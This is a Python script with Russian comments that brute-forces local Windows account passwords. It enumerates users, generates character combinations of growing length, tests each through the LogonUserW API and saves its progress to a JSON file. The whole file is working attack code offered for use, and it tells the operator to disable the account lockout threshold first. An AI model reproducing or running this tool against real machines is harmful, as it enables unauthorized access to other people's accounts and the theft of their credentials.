import ctypes
from ctypes import wintypes
import win32security
import subprocess
import win32api
import itertools
import string
import time
import json
import os
import sys

from source.list_users import list_users
from source.load_and_save_progress import load_progress, save_progress
from source.characters_for_password import charactes_password



print("Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!\n")
print(f"Автор: separeit894\n"
      f"Ccылка на github: https://github.com/separeit894/")

users_list = list_users()

# Эта функция потребуется для того, чтобы консоль могла работать с кирилицей
LogonUser = ctypes.windll.advapi32.LogonUserW
LogonUser.argtypes = (
    wintypes.LPCWSTR,  # Имя пользователя
    wintypes.LPCWSTR,  # Домен
    wintypes.LPCWSTR,  # Пароль
    wintypes.DWORD,    # Тип входа
    wintypes.DWORD,    # Провайдер
    ctypes.POINTER(wintypes.HANDLE)  # Токен
)

LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

characters = ''

progress_file = "progress.json"

# Параметр по умолчанию, изменять можете тут или в файле progress.json
print_try = "y"

# Загрузка прогресса
progress = load_progress()
if progress:
    account = progress['account']
    i = progress['length']
    try_id = progress['try_id']
    tryed = progress['tryed']
    characters = progress['characters']
    print_try = progress['print_try']
else:
    i = 1
    try_id = 0
    tryed = []
    # Указываем имя пользователя и пароль
    while True:
        account = str(input("Введите имя учетной записи: "))
        # Проверяет есть ли учетная запись, которую ввел пользователь в списке
        if account in users_list:
            print("Учетная запись найдена")
            break
        # Если её нет, то пользователь должен уже ввести корректную учетную запись
        else:
            print("Учетная запись не найдена!\n Введите имя учетной записи еще раз")

    level = 0
    while True:
        if characters == "":
            if level > 1:
                print(f"\nВы должны что-то выбрать!\n")
            characters = charactes_password(characters)
            level += 1
        else:
            break

username = account  


found = False

try:
    # Цикл будет работать, пока не найдет подходящий пароль
    while not found:
        # Циклом создаем новые пароли, characters это тот список символов, которые вы выбрали в начале
        for password in itertools.product(characters, repeat=i):
            password = "".join(password)
            if not password in tryed:
                try_id += 1
                # Попытка входа в систему
                token = wintypes.HANDLE()
                result = LogonUser(
                username,
                None,  # Локальная учетная запись
                password,
                LOGON32_LOGON_INTERACTIVE,
                LOGON32_PROVIDER_DEFAULT,
                ctypes.byref(token)
                )

                # Если в файле progress.json, параметр print_try ( y )
                if print_try == "y":
                    if result:
                        print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                        found = True
                        input("Нажмите на Enter........ ")
                        break
                    else:
                        print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                        tryed.append(password)
                        if win32api.GetLastError() == 1909:
                            print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                            input("Нажмите на Enter........ ")
                            # Завершает работу
                            sys.exit()

                # Если в файле progress.json, параметр print_try ( n )
                else:
                    # Выводит в случае, если получилось войти в учетную запись
                    if result:
                        print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                        found = True
                        input("Нажмите на Enter........ ")
                        break
                    else:
                        """
                        Будет выводить попытки раз в 250 попыток
                        Управлять этим параметром можно в файле progress.json
                        Параметр print_try (y/n)
                        """
                        if try_id % 250 == 0:
                            print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                        tryed.append(password)
                        if win32api.GetLastError() == 1909:
                            print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                            input("Нажмите на Enter........ ")
                            sys.exit()


                # Сохраняем прогресс после каждой попытки
                save_progress(account, characters, i, try_id, tryed)

        # Увеличиваем длину пароля, если не нашли подходящий
        if not found:
            i += 1
# Если пользователь хочет прервать процесс
except KeyboardInterrupt:
    save_progress(account, characters, i, try_id, tryed)
    print("Программа прервана. Прогресс сохранен.")
    input("Нажмите на Enter........ ")

# Если произошла ошибка
except Exception as ex:
    print("Произошла ошибка: ", ex)
    input("Нажмите на Enter........ ")

